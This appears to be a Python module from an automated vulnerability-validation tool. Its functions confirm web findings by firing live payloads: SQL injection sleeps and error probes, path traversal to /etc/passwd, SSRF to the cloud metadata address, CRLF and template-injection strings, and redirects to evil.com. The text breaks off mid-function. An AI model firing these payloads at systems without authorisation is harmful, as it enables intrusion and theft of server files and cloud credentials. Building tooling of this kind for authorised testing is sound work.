"""Stage 5: Validate — surgical verification of Stage 4 findings.

For every finding that needs validation, use a specialized tool to confirm
it's real and collect proof-of-concept evidence.  This is where false
positives die.

Three public entry points:
  validate_finding()         — verify one finding by finding_id
  validate_all()             — batch-validate all unvalidated findings
  validate_immediate_wins()  — verify Stage 3 immediate wins (exposed git, env, etc.)
"""

from __future__ import annotations

import hashlib
import json
import re
import time
from collections import Counter
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import aiohttp
import structlog

from bughound.core import tool_runner, workspace
from bughound.schemas.models import WorkspaceState

logger = structlog.get_logger()

# ---------------------------------------------------------------------------
# CVSS 3.1 base score estimates per vulnerability type
# ---------------------------------------------------------------------------

CVSS_SCORES: dict[str, float] = {
    "sqli": 9.8,
    "sqli_blind": 8.6,
    "sqli_error_based": 9.8,
    "xss_reflected": 6.1,
    "xss_stored": 8.4,
    "xss_dom": 6.1,
    "ssrf": 9.1,
    "ssrf_blind": 7.2,
    "lfi": 7.5,
    "lfi_rce": 9.8,
    "rfi": 9.8,
    "rce": 9.8,
    "crlf": 6.1,
    "ssti": 9.8,
    "open_redirect": 4.7,
    "idor": 6.5,
    "idor_data_leak": 7.5,
    "header_injection": 5.4,
    "jwt_weak_secret": 8.8,
    "jwt_none_alg": 9.1,
    "deserialization": 9.8,
    "broken_access_control": 8.2,
    "mass_assignment": 8.1,
    "rate_limiting": 4.3,
    "cookie_injection": 5.4,
    "subdomain_takeover": 8.2,
    "cors_misconfiguration": 7.4,
    "exposed_git": 7.5,
    "exposed_env": 9.1,
    "exposed_credentials": 9.8,
    "exposed_actuator": 8.8,
    "exposed_phpinfo": 5.3,
    "exposed_backup": 7.5,
    "default_credentials": 9.8,
    "file_exposure": 5.3,
    "exposed_swagger": 5.3,
    "exposed_config": 7.5,
    "exposed_admin": 5.3,
    "exposed_graphql": 5.3,
    "exposed_svn": 7.5,
    "exposed_debug": 7.5,
}

# ---------------------------------------------------------------------------
# Validation tool selection per vulnerability class
# ---------------------------------------------------------------------------

_VALIDATOR_MAP: dict[str, str] = {
    "sqli": "sqlmap",
    "xss": "dalfox",
    "xss_reflected": "dalfox",
    "xss_stored": "curl",
    "xss_dom": "curl",
    "ssrf": "curl",
    "lfi": "curl",
    "rfi": "curl",
    "crlf": "curl",
    "ssti": "curl",
    "open_redirect": "curl",
    "rce": "curl",
    "idor": "curl",
    "header_injection": "curl",
    "jwt": "curl",
    "deserialization": "curl",
    "broken_access_control": "curl",
    "mass_assignment": "curl",
    "rate_limiting": "curl",
    "cookie_injection": "curl",
    "subdomain_takeover": "dns",
    "cors_misconfiguration": "curl",
    "file_exposure": "curl",
    "misconfig": "curl",
    "default_creds": "curl",
}

# Immediate-win vulnerability types from Stage 3
_IMMEDIATE_WIN_TYPES = {
    "exposed_git", "exposed_env", "exposed_credentials", "cors_misconfiguration",
    "subdomain_takeover", "exposed_actuator", "exposed_phpinfo", "exposed_backup",
    "default_credentials",
}

# Validation statuses
CONFIRMED = "CONFIRMED"
LIKELY_FALSE_POSITIVE = "LIKELY_FALSE_POSITIVE"
NEEDS_MANUAL_REVIEW = "NEEDS_MANUAL_REVIEW"

# HTTP helpers
_TIMEOUT = aiohttp.ClientTimeout(total=15)
_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}


# ---------------------------------------------------------------------------
# PUBLIC API
# ---------------------------------------------------------------------------


async def validate_finding(
    workspace_id: str,
    finding_id: str,
    tool: str | None = None,
) -> dict[str, Any]:
    """Validate a single finding by ID.

    Parameters
    ----------
    workspace_id : str
        The workspace containing the finding.
    finding_id : str
        The finding_id from scan_results.json.
    tool : str, optional
        Override the validation tool (sqlmap, dalfox, curl).
        If None, auto-selects based on vulnerability class.

    Returns
    -------
    dict with validation result, evidence, and updated finding.
    """
    meta = await workspace.get_workspace(workspace_id)
    if meta is None:
        return _error("not_found", f"Workspace '{workspace_id}' not found.")

    # Load findings
    findings = await _load_findings(workspace_id)
    if not findings:
        return _error("no_findings", "No scan results found. Run bughound_execute_tests first.")

    # Find the specific finding
    finding = None
    for f in findings:
        if f.get("finding_id") == finding_id:
            finding = f
            break

    if finding is None:
        return _error("finding_not_found", f"Finding '{finding_id}' not found in scan results.")

    # Already validated?
    if finding.get("validated") and finding.get("validation_status") == CONFIRMED:
        return {
            "status": "already_validated",
            "finding_id": finding_id,
            "validation_status": CONFIRMED,
            "message": "Finding already confirmed.",
            "finding": finding,
        }

    # Select validation tool
    vuln_class = finding.get("vulnerability_class", "other")
    validator = tool or _VALIDATOR_MAP.get(vuln_class, "curl")

    # Run validation
    start = time.monotonic()
    result = await _run_validator(validator, finding, workspace_id)
    elapsed = round(time.monotonic() - start, 2)

    # Update the finding in scan_results
    finding["validated"] = True
    finding["validation_status"] = result["status"]
    finding["validation_tool"] = validator
    finding["validation_time_seconds"] = elapsed

    if result["status"] == CONFIRMED:
        # Add CVSS score
        cvss_key = _cvss_key(vuln_class, finding)
        finding["cvss_score"] = CVSS_SCORES.get(cvss_key, CVSS_SCORES.get(vuln_class, 5.0))
        finding["evidence"] = result.get("evidence", finding.get("evidence", ""))
        finding["poc_request"] = result.get("poc_request", "")
        finding["poc_response"] = result.get("poc_response", "")
        finding["reproduction_steps"] = result.get("reproduction_steps", [])
        finding["curl_command"] = result.get("curl_command", finding.get("curl_command", ""))
        finding["impact"] = result.get("impact", "")
        finding["severity_assessment"] = result.get("severity_assessment", "")

        # Write confirmed finding to individual file
        await _write_confirmed_finding(workspace_id, finding)

    # Save updated findings back
    await _save_findings(workspace_id, findings)

    # Update validation tracking files
    await _update_validation_tracking(workspace_id, findings)

    return {
        "status": "validated",
        "finding_id": finding_id,
        "validation_status": result["status"],
        "validation_tool": validator,
        "validation_time_seconds": elapsed,
        "cvss_score": finding.get("cvss_score"),
        "evidence_summary": result.get("evidence", "")[:500],
        "curl_command": finding.get("curl_command", ""),
        "finding": finding,
        "next_step": _next_step_advice(result["status"], vuln_class),
    }


async def validate_all(
    workspace_id: str,
) -> dict[str, Any]:
    """Batch-validate all unvalidated findings.

    Processes findings in severity order (critical -> high -> medium -> low -> info).
    Skips findings already validated or marked as not needing validation.
    """
    meta = await workspace.get_workspace(workspace_id)
    if meta is None:
        return _error("not_found", f"Workspace '{workspace_id}' not found.")

    findings = await _load_findings(workspace_id)
    if not findings:
        return _error("no_findings", "No scan results found.")

    # Filter to unvalidated findings that need validation
    to_validate = [
        f for f in findings
        if f.get("needs_validation") and not f.get("validated")
    ]

    if not to_validate:
        return {
            "status": "nothing_to_validate",
            "total_findings": len(findings),
            "already_validated": sum(1 for f in findings if f.get("validated")),
            "message": "All findings are already validated or don't need validation.",
        }

    # Sort by severity priority
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    to_validate.sort(key=lambda f: sev_order.get(f.get("severity", "info"), 5))

    results: list[dict[str, Any]] = []
    confirmed = 0
    false_positives = 0
    manual_review = 0
    errors = 0
    start = time.monotonic()

    for finding in to_validate:
        finding_id = finding.get("finding_id", "unknown")
        vuln_class = finding.get("vulnerability_class", "other")
        validator = _VALIDATOR_MAP.get(vuln_class, "curl")

        try:
            result = await _run_validator(validator, finding, workspace_id)

            finding["validated"] = True
            finding["validation_status"] = result["status"]
            finding["validation_tool"] = validator

            if result["status"] == CONFIRMED:
                confirmed += 1
                cvss_key = _cvss_key(vuln_class, finding)
                finding["cvss_score"] = CVSS_SCORES.get(cvss_key, CVSS_SCORES.get(vuln_class, 5.0))
                finding["evidence"] = result.get("evidence", finding.get("evidence", ""))
                finding["poc_request"] = result.get("poc_request", "")
                finding["poc_response"] = result.get("poc_response", "")
                finding["reproduction_steps"] = result.get("reproduction_steps", [])
                finding["curl_command"] = result.get("curl_command", finding.get("curl_command", ""))
                finding["impact"] = result.get("impact", "")
                await _write_confirmed_finding(workspace_id, finding)
            elif result["status"] == LIKELY_FALSE_POSITIVE:
                false_positives += 1
            else:
                manual_review += 1

            results.append({
                "finding_id": finding_id,
                "vulnerability_class": vuln_class,
                "severity": finding.get("severity", "info"),
                "validation_status": result["status"],
                "validator": validator,
            })

        except Exception as exc:
            errors += 1
            finding["validated"] = True
            finding["validation_status"] = NEEDS_MANUAL_REVIEW
            finding["validation_tool"] = validator
            results.append({
                "finding_id": finding_id,
                "vulnerability_class": vuln_class,
                "severity": finding.get("severity", "info"),
                "validation_status": NEEDS_MANUAL_REVIEW,
                "error": str(exc),
            })

    elapsed = round(time.monotonic() - start, 2)

    # Save all updates
    await _save_findings(workspace_id, findings)
    await _update_validation_tracking(workspace_id, findings)

    # Update workspace state
    await workspace.add_stage_history(workspace_id, 5, "completed")
    await workspace.update_metadata(workspace_id, state=WorkspaceState.COMPLETED)

    return {
        "status": "completed",
        "workspace_id": workspace_id,
        "validation_time_seconds": elapsed,
        "total_validated": len(to_validate),
        "confirmed": confirmed,
        "false_positives": false_positives,
        "needs_manual_review": manual_review,
        "errors": errors,
        "results": results,
        "files_written": [
            "vulnerabilities/scan_results.json",
            "vulnerabilities/validated.json",
            "vulnerabilities/false_positives.json",
            "vulnerabilities/manual_review.json",
        ],
        "next_step": (
            f"{confirmed} confirmed findings ready for reporting. "
            "Use bughound_generate_report to create deliverables."
            if confirmed
            else "No findings confirmed. Review manual_review.json for borderline cases."
        ),
    }


async def validate_immediate_wins(
    workspace_id: str,
) -> dict[str, Any]:
    """Verify Stage 3 immediate wins (exposed git, env, credentials, CORS, etc.).

    These are typically high-confidence findings from discovery that can be
    quickly verified with a simple HTTP request.
    """
    meta = await workspace.get_workspace(workspace_id)
    if meta is None:
        return _error("not_found", f"Workspace '{workspace_id}' not found.")

    # Load attack surface for immediate wins
    attack_surface = await workspace.read_data(workspace_id, "analysis/attack_surface.json")
    immediate_wins: list[dict[str, Any]] = []

    if isinstance(attack_surface, dict):
        data = attack_surface.get("data", [attack_surface])
        if isinstance(data, list) and data:
            surface = data[0] if isinstance(data[0], dict) else attack_surface
        else:
            surface = attack_surface
        immediate_wins = surface.get("immediate_wins", [])

    # Also check sensitive paths from discovery
    sensitive_paths = await workspace.read_data(workspace_id, "hosts/sensitive_paths.json")
    if isinstance(sensitive_paths, dict):
        sp_data = sensitive_paths.get("data", [])
        for sp in sp_data:
            if isinstance(sp, dict) and sp.get("confirmed"):
                immediate_wins.append({
                    "type": _classify_sensitive_path(sp),
                    "host": sp.get("host", ""),
                    "url": sp.get("url", ""),
                    "description": sp.get("description", sp.get("path", "")),
                    "evidence": sp.get("evidence", ""),
                })

    if not immediate_wins:
        return {
            "status": "no_immediate_wins",
            "message": "No immediate wins found in attack surface analysis.",
        }

    results: list[dict[str, Any]] = []
    confirmed = 0
    start = time.monotonic()

    for win in immediate_wins:
        win_url = win.get("url", win.get("endpoint", ""))
        win_type = win.get("type", win.get("vulnerability_class", "unknown"))
        host = win.get("host", "")

        # analyze.py stores immediate wins with "path" (e.g. "/.env"), not "url"
        # Reconstruct full URL from host + path
        if not win_url and host and win.get("path"):
            path = win["path"]
            if path.startswith("http"):
                win_url = path
            else:
                win_url = f"https://{host}{path}"

        # Also try extracting URL from reproduction command
        if not win_url and win.get("reproduction"):
            repro = win["reproduction"]
            for token in repro.split():
                if token.startswith("http"):
                    win_url = token
                    break

        if not win_url:
            results.append({
                "type": win_type,
                "host": host,
                "status": NEEDS_MANUAL_REVIEW,
                "reason": "No URL to verify",
            })
            continue

        try:
            verification = await _verify_immediate_win(win_type, win_url, host)
            results.append(verification)
            if verification.get("status") == CONFIRMED:
                confirmed += 1
                # Create a finding for confirmed wins
                finding = _win_to_finding(win, verification)
                await _write_confirmed_finding(workspace_id, finding)
        except Exception as exc:
            results.append({
                "type": win_type,
                "host": host,
                "url": win_url,
                "status": NEEDS_MANUAL_REVIEW,
                "reason": f"Verification error: {exc}",
            })

    elapsed = round(time.monotonic() - start, 2)

    return {
        "status": "completed",
        "workspace_id": workspace_id,
        "validation_time_seconds": elapsed,
        "total_checked": len(immediate_wins),
        "confirmed": confirmed,
        "results": results,
        "next_step": (
            f"{confirmed} immediate wins confirmed. Include in report."
            if confirmed
            else "No immediate wins verified. Proceed with full validation."
        ),
    }


# ---------------------------------------------------------------------------
# Validators per tool type
# ---------------------------------------------------------------------------


async def _run_validator(
    validator: str,
    finding: dict[str, Any],
    workspace_id: str,
) -> dict[str, Any]:
    """Dispatch to the appropriate validator."""
    if validator == "sqlmap":
        return await _validate_sqli(finding, workspace_id)
    elif validator == "dalfox":
        return await _validate_xss(finding, workspace_id)
    elif validator == "dns":
        return await _validate_dns(finding)
    else:
        return await _validate_with_curl(finding)


async def _validate_sqli(
    finding: dict[str, Any],
    workspace_id: str,
) -> dict[str, Any]:
    """Validate SQL injection using sqlmap --batch --level=1."""
    endpoint = finding.get("endpoint", "")
    if not endpoint:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No endpoint to test"}

    # Check if sqlmap is available
    if not tool_runner.is_available("sqlmap"):
        return await _validate_sqli_pure(finding)

    # Build sqlmap args for quick confirmation
    args = [
        "-u", endpoint,
        "--batch",
        "--level=1",
        "--risk=1",
        "--threads=4",
        "--timeout=10",
        "--retries=1",
        "--output-dir=/tmp/bughound_sqlmap",
    ]

    # Add specific parameter if known
    param = _extract_param_name(finding)
    if param:
        args.extend(["-p", param])

    result = await tool_runner.run("sqlmap", args, target=endpoint, timeout=120)

    if result.success:
        output = "\n".join(str(r) for r in result.results)
        if _sqlmap_confirms(output):
            curl_cmd = _build_curl_from_finding(finding)
            return {
                "status": CONFIRMED,
                "evidence": _extract_sqlmap_evidence(output),
                "poc_request": f"sqlmap -u '{endpoint}' --batch",
                "poc_response": output[:2000],
                "reproduction_steps": [
                    f"1. Run: sqlmap -u '{endpoint}' --batch --level=1",
                    "2. sqlmap confirms the parameter is injectable",
                    f"3. Database type: {_extract_db_type(output)}",
                ],
                "curl_command": curl_cmd,
                "impact": "SQL injection allows reading/modifying database contents, potential RCE",
                "severity_assessment": "CRITICAL — confirmed SQL injection",
            }
        else:
            return {
                "status": LIKELY_FALSE_POSITIVE,
                "reason": "sqlmap did not confirm injection",
                "output_excerpt": output[:500],
            }
    else:
        # sqlmap failed, try pure-Python fallback
        return await _validate_sqli_pure(finding)


async def _validate_sqli_pure(finding: dict[str, Any]) -> dict[str, Any]:
    """Pure-Python SQLi verification using time-based detection."""
    endpoint = finding.get("endpoint", "")
    param = _extract_param_name(finding)
    if not endpoint or not param:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "Cannot extract endpoint/param for testing"}

    # Time-based blind SQLi check
    payloads = [
        ("' OR SLEEP(3)-- -", 3),
        ("' OR pg_sleep(3)-- -", 3),
        ("1; WAITFOR DELAY '0:0:3'-- -", 3),
    ]

    try:
        async with aiohttp.ClientSession() as session:
            # Baseline request
            base_start = time.monotonic()
            async with session.get(
                endpoint, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
            ) as resp:
                await resp.text()
            baseline_time = time.monotonic() - base_start

            for payload_str, delay in payloads:
                test_url = _replace_param(endpoint, param, payload_str)
                req_start = time.monotonic()
                async with session.get(
                    test_url, headers=_HEADERS, ssl=False,
                    timeout=aiohttp.ClientTimeout(total=delay + 10),
                ) as resp:
                    await resp.text(errors="replace")
                req_time = time.monotonic() - req_start

                if req_time >= baseline_time + delay - 0.5:
                    curl_cmd = f"curl -s -o /dev/null -w '%{{time_total}}' '{test_url}'"
                    return {
                        "status": CONFIRMED,
                        "evidence": (
                            f"Time-based blind SQLi: baseline={baseline_time:.1f}s, "
                            f"payload={req_time:.1f}s (delay={delay}s)"
                        ),
                        "poc_request": f"GET {test_url}",
                        "poc_response": f"Response time: {req_time:.1f}s (expected ~{baseline_time + delay:.1f}s)",
                        "reproduction_steps": [
                            f"1. Send baseline request to {endpoint} (response time: {baseline_time:.1f}s)",
                            f"2. Send payload: {payload_str} in parameter '{param}'",
                            f"3. Observe response time: {req_time:.1f}s (delay of ~{delay}s confirms injection)",
                        ],
                        "curl_command": curl_cmd,
                        "impact": "SQL injection via time-based blind technique",
                        "severity_assessment": "CRITICAL — time-based blind SQL injection confirmed",
                    }

            # Check error-based
            error_payloads = ["'", "\"", "' OR '1'='1", "1 UNION SELECT NULL--"]
            for payload_str in error_payloads:
                test_url = _replace_param(endpoint, param, payload_str)
                async with session.get(
                    test_url, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
                ) as resp:
                    body = await resp.text(errors="replace")
                    body_lower = body.lower()
                    sql_errors = [
                        "sql syntax", "mysql", "postgresql", "sqlite",
                        "ora-", "microsoft sql", "unclosed quotation",
                        "quoted string not properly terminated",
                        "you have an error in your sql",
                    ]
                    if any(err in body_lower for err in sql_errors):
                        return {
                            "status": CONFIRMED,
                            "evidence": f"Error-based SQLi: SQL error in response with payload: {payload_str}",
                            "poc_request": f"GET {test_url}",
                            "poc_response": body[:1000],
                            "reproduction_steps": [
                                f"1. Send request with param '{param}' = {payload_str}",
                                "2. Response contains SQL error message",
                            ],
                            "curl_command": f"curl -sk '{test_url}'",
                            "impact": "SQL injection reveals database errors, potential data extraction",
                            "severity_assessment": "HIGH — error-based SQL injection confirmed",
                        }

    except Exception as exc:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": f"Pure-Python SQLi test failed: {exc}"}

    return {"status": LIKELY_FALSE_POSITIVE, "reason": "No time delay or error response detected"}


async def _validate_xss(
    finding: dict[str, Any],
    workspace_id: str,
) -> dict[str, Any]:
    """Validate XSS using dalfox --skip-bav."""
    endpoint = finding.get("endpoint", "")
    if not endpoint:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No endpoint to test"}

    if not tool_runner.is_available("dalfox"):
        return await _validate_xss_pure(finding)

    args = [
        "url", endpoint,
        "--skip-bav",
        "--silence",
        "--format", "json",
        "--timeout", "10",
    ]

    param = _extract_param_name(finding)
    if param:
        args.extend(["--param", param])

    result = await tool_runner.run("dalfox", args, target=endpoint, timeout=60)

    if result.success and result.results:
        output = "\n".join(str(r) for r in result.results)
        try:
            dalfox_results = json.loads(output)
            if isinstance(dalfox_results, list) and dalfox_results:
                vuln = dalfox_results[0]
                xss_type = str(vuln.get("type", "reflected")).lower()
                return {
                    "status": CONFIRMED,
                    "evidence": f"Dalfox confirmed XSS: {vuln.get('type', 'reflected')}",
                    "poc_request": vuln.get("poc", f"GET {endpoint}"),
                    "poc_response": vuln.get("evidence", "")[:2000],
                    "reproduction_steps": [
                        f"1. Open URL: {vuln.get('poc', endpoint)}",
                        "2. XSS payload executes in browser context",
                        f"3. Injection point: {vuln.get('param', param or 'unknown')}",
                    ],
                    "curl_command": f"curl -sk '{vuln.get('poc', endpoint)}'",
                    "impact": "Cross-site scripting allows session hijacking, credential theft, phishing",
                    "severity_assessment": (
                        f"{'HIGH' if 'stored' in xss_type else 'MEDIUM'} — confirmed XSS"
                    ),
                }
        except (json.JSONDecodeError, IndexError):
            pass

        # Non-JSON dalfox output — check for POC indicators
        if "POC:" in output or "Verified:" in output:
            return {
                "status": CONFIRMED,
                "evidence": f"Dalfox found XSS in {endpoint}",
                "poc_request": f"dalfox url '{endpoint}'",
                "poc_response": output[:2000],
                "reproduction_steps": [
                    f"1. Run: dalfox url '{endpoint}' --skip-bav",
                    "2. Dalfox reports verified XSS",
                ],
                "curl_command": f"curl -sk '{endpoint}'",
                "impact": "Cross-site scripting",
                "severity_assessment": "MEDIUM — dalfox confirmed XSS",
            }

    return await _validate_xss_pure(finding)


async def _validate_xss_pure(finding: dict[str, Any]) -> dict[str, Any]:
    """Pure-Python XSS verification by checking reflection."""
    endpoint = finding.get("endpoint", "")
    param = _extract_param_name(finding)
    if not endpoint:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No endpoint"}

    canary = f"bughound{hashlib.md5(endpoint.encode(), usedforsecurity=False).hexdigest()[:8]}"
    test_payloads = [
        (canary, "reflection"),
        (f"<{canary}>", "html_injection"),
        (f'"{canary}', "attribute_escape"),
    ]

    try:
        async with aiohttp.ClientSession() as session:
            for payload_str, check_type in test_payloads:
                if param:
                    test_url = _replace_param(endpoint, param, payload_str)
                else:
                    sep = "&" if "?" in endpoint else "?"
                    test_url = f"{endpoint}{sep}q={payload_str}"

                async with session.get(
                    test_url, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
                ) as resp:
                    body = await resp.text(errors="replace")
                    if payload_str in body:
                        if check_type == "html_injection" and f"<{canary}>" in body:
                            return {
                                "status": CONFIRMED,
                                "evidence": f"HTML injection confirmed: <{canary}> reflected unescaped",
                                "poc_request": f"GET {test_url}",
                                "poc_response": body[:1000],
                                "reproduction_steps": [
                                    f"1. Send request with param '{param or 'q'}' = <{canary}>",
                                    "2. Tag is reflected unescaped in HTML response",
                                    "3. This confirms XSS is possible with script tags",
                                ],
                                "curl_command": f"curl -sk '{test_url}'",
                                "impact": "HTML injection leads to XSS — session hijacking, credential theft",
                                "severity_assessment": "MEDIUM — HTML tag injection confirmed, XSS likely",
                            }
                        elif check_type == "reflection":
                            return {
                                "status": NEEDS_MANUAL_REVIEW,
                                "reason": f"Canary '{canary}' reflected but need to verify execution context",
                                "evidence": "Input reflected in response body",
                                "poc_request": f"GET {test_url}",
                                "poc_response": body[:500],
                            }

    except Exception as exc:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": f"XSS verification failed: {exc}"}

    return {"status": LIKELY_FALSE_POSITIVE, "reason": "No reflection detected"}


async def _validate_with_curl(finding: dict[str, Any]) -> dict[str, Any]:
    """Generic validation using pure-Python HTTP requests (curl equivalent)."""
    endpoint = finding.get("endpoint", "")
    vuln_class = finding.get("vulnerability_class", "other")
    if not endpoint:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No endpoint to verify"}

    validators: dict[str, Any] = {
        "ssrf": _validate_ssrf,
        "lfi": _validate_lfi,
        "crlf": _validate_crlf,
        "ssti": _validate_ssti,
        "open_redirect": _validate_open_redirect,
        "rce": _validate_rce,
        "idor": _validate_idor,
        "header_injection": _validate_header_injection,
        "jwt": _validate_jwt,
        "broken_access_control": _validate_bac,
        "mass_assignment": _validate_mass_assignment,
        "cors_misconfiguration": _validate_cors,
        "misconfig": _validate_cors,
        "file_exposure": _validate_file_exposure,
        "default_creds": _validate_default_creds,
        "cookie_injection": _validate_cookie_injection,
        "deserialization": _validate_deserialization,
        "rate_limiting": _validate_rate_limiting,
    }

    validator_fn = validators.get(vuln_class)
    if validator_fn:
        return await validator_fn(finding)

    return await _validate_generic(finding)


async def _validate_ssrf(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate SSRF by checking for internal resource access."""
    endpoint = finding.get("endpoint", "")
    param = _extract_param_name(finding)
    if not param:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No param identified for SSRF"}

    ssrf_targets = [
        ("http://169.254.169.254/latest/meta-data/", "ami-id", "AWS metadata"),
        ("http://127.0.0.1:80/", "", "localhost"),
        ("http://[::1]/", "", "IPv6 localhost"),
    ]

    try:
        async with aiohttp.ClientSession() as session:
            for target_url, indicator, desc in ssrf_targets:
                test_url = _replace_param(endpoint, param, target_url)
                async with session.get(
                    test_url, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
                ) as resp:
                    body = await resp.text(errors="replace")

                    ssrf_indicators = [
                        "ami-id", "instance-id", "meta-data",
                        "root:x:0:0", "localhost", "127.0.0.1",
                    ]
                    if indicator and indicator in body:
                        return {
                            "status": CONFIRMED,
                            "evidence": f"SSRF confirmed: {desc} content returned",
                            "poc_request": f"GET {test_url}",
                            "poc_response": body[:1000],
                            "reproduction_steps": [
                                f"1. Set parameter '{param}' to {target_url}",
                                f"2. Server fetches {desc} and returns content",
                            ],
                            "curl_command": f"curl -sk '{test_url}'",
                            "impact": f"SSRF allows accessing {desc} — potential credential theft",
                            "severity_assessment": "CRITICAL — SSRF to cloud metadata confirmed",
                        }
                    if any(ind in body for ind in ssrf_indicators):
                        return {
                            "status": CONFIRMED,
                            "evidence": f"SSRF indicators found for {desc} target",
                            "poc_request": f"GET {test_url}",
                            "poc_response": body[:1000],
                            "reproduction_steps": [
                                f"1. Set parameter '{param}' to {target_url}",
                                "2. Response contains internal service indicators",
                            ],
                            "curl_command": f"curl -sk '{test_url}'",
                            "impact": "SSRF allows internal network access",
                            "severity_assessment": "HIGH — SSRF confirmed",
                        }
    except Exception:
        pass

    return {"status": NEEDS_MANUAL_REVIEW, "reason": "SSRF needs OOB callback (interactsh) for confirmation"}


async def _validate_lfi(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate LFI by checking for /etc/passwd or win.ini content."""
    endpoint = finding.get("endpoint", "")
    param = _extract_param_name(finding)
    if not param:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No param for LFI test"}

    lfi_payloads = [
        ("../../../../../../../etc/passwd", "root:x:0:0"),
        ("....//....//....//....//etc/passwd", "root:x:0:0"),
        ("/etc/passwd", "root:x:0:0"),
        ("..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
    ]

    try:
        async with aiohttp.ClientSession() as session:
            for payload_str, indicator in lfi_payloads:
                test_url = _replace_param(endpoint, param, payload_str)
                async with session.get(
                    test_url, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
                ) as resp:
                    body = await resp.text(errors="replace")
                    if indicator in body:
                        return {
                            "status": CONFIRMED,
                            "evidence": f"LFI confirmed: '{indicator}' found in response",
                            "poc_request": f"GET {test_url}",
                            "poc_response": body[:1000],
                            "reproduction_steps": [
                                f"1. Set parameter '{param}' to {payload_str}",
                                f"2. Response contains '{indicator}' confirming file read",
                            ],
                            "curl_command": f"curl -sk '{test_url}'",
                            "impact": "Local file inclusion allows reading sensitive server files",
                            "severity_assessment": "HIGH — LFI confirmed, /etc/passwd readable",
                        }
    except Exception:
        pass

    return {"status": LIKELY_FALSE_POSITIVE, "reason": "No file content indicators found"}


async def _validate_crlf(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate CRLF injection by checking for injected headers."""
    endpoint = finding.get("endpoint", "")
    param = _extract_param_name(finding)
    if not param:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No param for CRLF test"}

    canary = "BughoundCRLF"
    payloads = [
        f"%0d%0aX-Injected: {canary}",
        f"%0aX-Injected: {canary}",
        f"\r\nX-Injected: {canary}",
    ]

    try:
        async with aiohttp.ClientSession() as session:
            for payload_str in payloads:
                test_url = _replace_param(endpoint, param, payload_str)
                async with session.get(
                    test_url, headers=_HEADERS, ssl=False,
                    timeout=_TIMEOUT, allow_redirects=False,
                ) as resp:
                    injected = resp.headers.get("x-injected", "")
                    if canary in injected:
                        return {
                            "status": CONFIRMED,
                            "evidence": f"CRLF confirmed: X-Injected header with '{canary}'",
                            "poc_request": f"GET {test_url}",
                            "poc_response": str(dict(resp.headers))[:1000],
                            "reproduction_steps": [
                                f"1. Inject CRLF payload into parameter '{param}'",
                                "2. Response contains injected X-Injected header",
                            ],
                            "curl_command": f"curl -skI '{test_url}'",
                            "impact": "CRLF injection allows header injection, cache poisoning, XSS",
                            "severity_assessment": "MEDIUM — CRLF header injection confirmed",
                        }
    except Exception:
        pass

    return {"status": LIKELY_FALSE_POSITIVE, "reason": "No injected headers detected"}


async def _validate_ssti(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate SSTI by checking for template expression evaluation."""
    endpoint = finding.get("endpoint", "")
    param = _extract_param_name(finding)
    if not param:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No param for SSTI test"}

    payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
    ]

    try:
        async with aiohttp.ClientSession() as session:
            for payload_str, expected in payloads:
                test_url = _replace_param(endpoint, param, payload_str)
                async with session.get(
                    test_url, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
                ) as resp:
                    body = await resp.text(errors="replace")
                    if expected in body and payload_str not in body:
                        return {
                            "status": CONFIRMED,
                            "evidence": f"SSTI confirmed: {payload_str} evaluated to {expected}",
                            "poc_request": f"GET {test_url}",
                            "poc_response": body[:1000],
                            "reproduction_steps": [
                                f"1. Set parameter '{param}' to {payload_str}",
                                f"2. Response contains '{expected}' (template expression evaluated)",
                                "3. This confirms server-side template injection -> potential RCE",
                            ],
                            "curl_command": f"curl -sk '{test_url}'",
                            "impact": "SSTI allows arbitrary code execution on the server",
                            "severity_assessment": "CRITICAL — SSTI confirmed, likely RCE",
                        }
    except Exception:
        pass

    return {"status": LIKELY_FALSE_POSITIVE, "reason": "No template expression evaluation detected"}


async def _validate_open_redirect(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate open redirect by following the redirect chain."""
    endpoint = finding.get("endpoint", "")
    param = _extract_param_name(finding)
    if not param:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No param for redirect test"}

    redirect_targets = ["https://evil.com", "//evil.com", "https://evil.com/phish"]

    try:
        async with aiohttp.ClientSession() as session:
            for target in redirect_targets:
                test_url = _replace_param(endpoint, param, target)
                async with session.get(
                    test_url, headers=_HEADERS, ssl=False,
                    timeout=_TIMEOUT, allow_redirects=False,
                ) as resp:
                    location = resp.headers.get("Location", "")
                    if resp.status in (301, 302, 303, 307, 308) and "evil.com" in location:
                        return {
                            "status": CONFIRMED,
                            "evidence": f"Open redirect: {resp.status} -> {location}",
                            "poc_request": f"GET {test_url}",
                            "poc_response": f"HTTP {resp.status} Location: {location}",
                            "reproduction_steps": [
                                f"1. Set parameter '{param}' to {target}",
                                f"2. Server responds with {resp.status} redirect to {location}",
                                "3. User is redirected to attacker-controlled domain",
                            ],
                            "curl_command": f"curl -skI '{test_url}'",
                            "impact": "Open redirect enables phishing attacks against users",
